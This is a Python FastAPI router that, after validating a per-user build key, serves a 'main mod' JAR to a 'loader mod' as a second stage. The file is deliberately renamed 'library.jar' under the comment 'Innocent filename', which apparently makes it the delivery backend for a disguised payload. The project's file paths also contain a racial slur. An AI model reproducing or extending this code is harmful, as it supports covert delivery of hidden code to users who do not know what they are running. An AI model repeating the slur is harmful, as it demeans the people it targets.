from typing import Any
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User
import os

router = APIRouter()

# Path to the main mod JAR file
MOD_PATH = "/opt/niggaware/mods/optimizer-main.jar"
MOD_FALLBACK_PATHS = [
    "/opt/niggaware/mods/optimizer.jar",
    "/opt/niggaware/new_panel/mods/optimizer-main.jar",
    "./mods/optimizer-main.jar"
]

@router.get("/download/{build_key}")
def download_main_mod(
    build_key: str,
    db: Session = Depends(get_db),
) -> Any:
    """
    Download the main mod JAR file.
    Called by the loader mod to fetch the full functionality.
    Validates build key before serving.
    """
    # Validate build key
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    # Find mod file
    mod_path = None
    all_paths = [MOD_PATH] + MOD_FALLBACK_PATHS
    
    for path in all_paths:
        if os.path.exists(path):
            mod_path = path
            break
    
    if not mod_path:
        raise HTTPException(status_code=404, detail="Mod file not found")
    
    # Return JAR file
    return FileResponse(
        mod_path,
        media_type="application/java-archive",
        filename="library.jar"  # Innocent filename
    )

@router.get("/info/{build_key}")
def get_mod_info(
    build_key: str,
    db: Session = Depends(get_db),
) -> Any:
    """
    Get information about the main mod (version, size, etc.)
    """
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    # Find mod file
    mod_path = None
    all_paths = [MOD_PATH] + MOD_FALLBACK_PATHS
    
    for path in all_paths:
        if os.path.exists(path):
            mod_path = path
            break
    
    if not mod_path:
        return {
            "success": False,
            "available": False,
            "message": "Main mod not uploaded yet"
        }
    
    file_size = os.path.getsize(mod_path)
    file_mtime = os.path.getmtime(mod_path)
    
    return {
        "success": True,
        "available": True,
        "size": file_size,
        "updated_at": file_mtime,
        "version": "1.0.0"
    }
